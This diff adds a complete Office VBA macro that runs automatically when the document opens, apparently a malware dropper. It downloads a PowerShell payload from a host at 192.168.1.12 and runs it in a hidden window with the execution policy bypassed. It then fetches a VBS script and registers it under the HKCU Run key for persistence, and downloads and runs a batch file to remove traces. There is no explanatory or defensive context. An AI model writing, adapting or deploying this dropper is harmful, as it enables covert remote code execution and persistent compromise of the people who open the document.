@@ -1,0 +1,147 @@
+Sub Auto_Open()
+Download
+If GetObject("winmgmts:root\cimv2:Win32_Processor='cpu0'").AddressWidth = 32 Then
+    Execute32
+Else
+    Execute64
+End If
+Persist
+DropBat
+RemovePayload
+End Sub
+
+Public Function Download() As Variant
+
+    Dim FileNum As Long
+    Dim FileData() As Byte
+    Dim MyFile As String
+    Dim WHTTP As Object
+
+    On Error Resume Next
+    Set WHTTP = CreateObject("WinHTTP.WinHTTPrequest.5")
+    If Err.Number <> 0 Then
+        Set WHTTP = CreateObject("WinHTTP.WinHTTPrequest.5.1")
+    End If
+    On Error GoTo 0
+    
+    MyFile = "http://192.168.1.12/x32.ps1"
+    
+    WHTTP.Open "GET", MyFile, False
+    WHTTP.Send
+    FileData = WHTTP.ResponseBody
+    Set WHTTP = Nothing
+    
+    If Dir("C:\Temp", vbDirectory) = Empty Then MkDir "C:\Temp"
+    FileNum = FreeFile
+    Open "C:\Temp\payload.ps1" For Binary Access Write As #FileNum
+    Put #FileNum, 1, FileData
+    Close #FileNum
+            
+    End Function
+    Public Function Execute32() As Variant
+    
+    Const HIDDEN_WINDOW = 0
+        strComputer = "."
+        Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
+         
+        Set objStartup = objWMIService.Get("Win32_ProcessStartup")
+        Set objConfig = objStartup.SpawnInstance_
+        objConfig.ShowWindow = HIDDEN_WINDOW
+        Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root\cimv2:Win32_Process")
+        objProcess.Create "C:\\WINDOWS\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -noprofile -noexit -file C:\Temp\payload.ps1", Null, objConfig, intProcessID
+                
+   
+    End Function
+
+    Public Function Execute64() As Variant
+     Const HIDDEN_WINDOW = 0
+        strComputer = "."
+        Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
+         
+        Set objStartup = objWMIService.Get("Win32_ProcessStartup")
+        Set objConfig = objStartup.SpawnInstance_
+        objConfig.ShowWindow = HIDDEN_WINDOW
+        Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root\cimv2:Win32_Process")
+        objProcess.Create "C:\\WINDOWS\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -noprofile -noexit -file C:\Temp\payload.ps1", Null, objConfig, intProcessID
+    End Function
+
+    Public Function Persist() As Variant
+    Dim FileNum1 As Long
+    Dim FileData1() As Byte
+    Dim MyFile1 As String
+    Dim WHTTP1 As Object
+    Dim WshShell As Object
+    
+    On Error Resume Next
+    Set WHTTP1 = CreateObject("WinHTTP.WinHTTPrequest.5")
+    If Err.Number <> 0 Then
+        Set WHTTP1 = CreateObject("WinHTTP.WinHTTPrequest.5.1")
+    End If
+    On Error GoTo 0
+    
+    MyFile1 = "http://192.168.1.12/persist.vbs"
+    
+    WHTTP1.Open "GET", MyFile1, False
+    WHTTP1.Send
+    FileData1 = WHTTP1.ResponseBody
+    Set WHTT1P = Nothing
+    
+    If Dir("C:\Temp", vbDirectory) = Empty Then MkDir "C:\Temp"
+    FileNum1 = FreeFile
+    Open "C:\Temp\persist.vbs" For Binary Access Write As #FileNum1
+    Put #FileNum1, 1, FileData1
+    Close #FileNum1
+    
+    
+    Set WshShell = CreateObject("WScript.Shell")
+    WshShell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Persist", "C:\Temp\persist.vbs", "REG_SZ"
+    Set WshShell = Nothing
+
+    
+       
+End Function
+
+
+Public Function DropBat() As Variant
+    Dim FileNum2 As Long
+    Dim FileData2() As Byte
+    Dim MyFile2 As String
+    Dim WHTTP2 As Object
+
+    On Error Resume Next
+    Set WHTTP2 = CreateObject("WinHTTP.WinHTTPrequest.5")
+    If Err.Number <> 0 Then
+        Set WHTTP2 = CreateObject("WinHTTP.WinHTTPrequest.5.1")
+    End If
+    On Error GoTo 0
+    
+    MyFile2 = "http://192.168.1.12/remove.bat"
+    
+    WHTTP2.Open "GET", MyFile2, False
+    WHTTP2.Send
+    FileData2 = WHTTP2.ResponseBody
+    Set WHTTP2 = Nothing
+    
+    If Dir("C:\Temp", vbDirectory) = Empty Then MkDir "C:\Temp"
+    FileNum2 = FreeFile
+    Open "C:\Temp\remove.bat" For Binary Access Write As #FileNum2
+    Put #FileNum2, 1, FileData2
+    Close #FileNum2
+
+End Function
+
+
+Public Function RemovePayload() As Variant
+
+Const HIDDEN_WINDOW = 0
+        strComputer = "."
+        Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
+         
+        Set objStartup = objWMIService.Get("Win32_ProcessStartup")
+        Set objConfig = objStartup.SpawnInstance_
+        objConfig.ShowWindow = HIDDEN_WINDOW
+        Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root\cimv2:Win32_Process")
+        objProcess.Create "C:\\WINDOWS\\system32\\cmd.exe /C C:\Temp\remove.bat", Null, objConfig, intProcessID
+
+End Function
+
